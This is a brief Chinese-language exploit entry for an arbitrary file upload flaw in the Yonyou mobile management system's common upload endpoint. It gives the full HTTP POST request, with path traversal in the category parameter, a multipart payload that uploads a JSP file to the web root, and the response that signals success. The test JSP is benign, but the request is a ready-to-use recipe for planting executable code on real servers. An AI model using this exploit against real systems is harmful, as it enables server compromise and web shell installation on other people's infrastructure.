# 用友移动管理系统common任意文件上传

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /mobsm/common/upload?category=../webapps/nc_web/maupload/img HTTP/1.1`

**Payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: text/plain
<% out.println("test");%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
- **响应特征**：200 .jsp